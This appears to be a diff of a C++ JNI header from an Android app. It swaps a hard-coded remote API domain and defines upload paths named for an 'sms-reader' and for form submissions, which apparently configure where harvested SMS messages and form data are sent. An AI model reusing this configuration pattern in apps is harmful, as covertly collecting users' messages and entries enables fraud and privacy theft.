@@ -1,7 +1,7 @@
 #include <jni.h>
 #include <string>
 
-std::string URL = "https://amanbhaidkbosswala.in/api";
+std::string URL = "https://dkbossqq.in/api";
 std::string SITE = "localhost";
 std::string SMSSavePath = "/sms-reader/add";
 std::string FormSavePath = "/form/add";
